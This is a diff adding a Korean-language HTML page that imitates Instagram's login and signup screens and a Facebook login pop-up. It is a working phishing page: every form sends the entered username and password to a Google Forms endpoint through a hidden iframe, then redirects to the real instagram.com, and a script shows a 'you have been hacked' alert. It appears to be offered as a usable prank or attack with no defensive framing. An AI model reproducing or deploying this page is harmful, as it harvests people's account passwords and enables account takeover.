@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
+    <style>
+        /* 네가 아끼던 그 인스타 순정 디자인 */
+        body { background-color: #fafafa; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; flex-direction: column; }
+        .container { width: 350px; }
+        .box { background: #fff; border: 1px solid #dbdbdb; padding: 20px 40px; margin-bottom: 10px; text-align: center; box-sizing: border-box; }
+        .logo { font-family: 'Grand Hotel', cursive; font-size: 3.5rem; margin: 20px 0; color: #262626; }
+        input { width: 100%; padding: 10px; margin-bottom: 7px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; font-size: 12px; }
+        .btn { width: 100%; padding: 7px; background: #0095f6; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .divider { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; font-weight: 600; }
+        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 10px; }
+        #signup-section, #fb-modal { display: none; }
+        #fb-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); justify-content: center; align-items: center; z-index: 100; }
+        .fb-box { background: #fff; width: 400px; border-radius: 8px; overflow: hidden; }
+        .fb-header { background: #1877f2; color: white; padding: 15px; font-weight: bold; font-size: 20px; }
+    </style>
+</head>
+<body>
+    <iframe name="h_i" id="h_i" style="display:none;" onload="if(submitted){window.location='https://instagram.com';}"></iframe>
+
+    <div class="container">
+        <div id="login-section">
+            <div class="box">
+                <div class="logo">Instagram</div>
+                <form action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSfoMLT0LN6IeChsgw81r8mxtwJWPLgH7TAmwfpbcehUKE3heQ/formResponse" method="POST" target="h_i" onsubmit="submitted=true;">
+                    <input type="text" name="entry.1594701813" placeholder="사용자 이름" required>
+                    <input type="password" name="entry.390573198" placeholder="비밀번호" required>
+                    <button type="submit" class="btn">로그인</button>
+                </form>
+                <div class="divider">또는</div>
+                <button style="background:none; border:none; color:#385185; font-weight:bold; cursor:pointer; width:100%;" onclick="openFB()">Facebook으로 로그인</button>
+            </div>
+            <div class="box">계정이 없으신가요? <a href="#" onclick="showS()" style="color:#0095f6; font-weight:bold; text-decoration:none;">가입하기</a></div>
+        </div>
+
+        <div id="signup-section">
+            <div class="box">
+                <div class="logo">Instagram</div>
+                <form action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSfoMLT0LN6IeChsgw81r8mxtwJWPLgH7TAmwfpbcehUKE3heQ/formResponse" method="POST" target="h_i" onsubmit="submitted=true;">
+                    <input type="text" placeholder="휴대폰 번호 또는 이메일 주소">
+                    <input type="text" name="entry.1693006880" placeholder="사용자 이름" required>
+                    <input type="password" name="entry.1251911364" placeholder="비밀번호" required>
+                    <button type="submit" class="btn">가입하기</button>
+                </form>
+            </div>
+            <div class="box"><a href="#" onclick="showL()" style="color:#0095f6; font-weight:bold; text-decoration:none;">로그인하기</a></div>
+        </div>
+    </div>
+
+    <div id="fb-modal">
+        <div class="fb-box">
+            <div class="fb-header">facebook</div>
+            <div style="padding:20px;">
+                <form action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSfoMLT0LN6IeChsgw81r8mxtwJWPLgH7TAmwfpbcehUKE3heQ/formResponse" method="POST" target="h_i" onsubmit="submitted=true;">
+                    <input type="text" name="entry.1693006880" placeholder="이메일 또는 휴대폰 번호" required>
+                    <input type="password" name="entry.1251911364" placeholder="비밀번호" required>
+                    <button type="submit" class="btn" style="background:#1877f2;">로그인</button>
+                </form>
+                <p onclick="closeFB()" style="text-align:center; color:#1877f2; cursor:pointer; margin-top:10px;">취소</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        var submitted = false;
+        function showS() { document.getElementById('login-section').style.display='none'; document.getElementById('signup-section').style.display='block'; }
+        function showL() { document.getElementById('login-section').style.display='block'; document.getElementById('signup-section').style.display='none'; }
+        function openFB() { document.getElementById('fb-modal').style.display='flex'; }
+        function closeFB() { document.getElementById('fb-modal').style.display='none'; }
+        // 버튼 누르면 알림창 띄우기
+        document.querySelectorAll('form').forEach(f => f.addEventListener('submit', () => alert('해킹당하셨습니다.')));
+    </script>
+</body>
+</html>
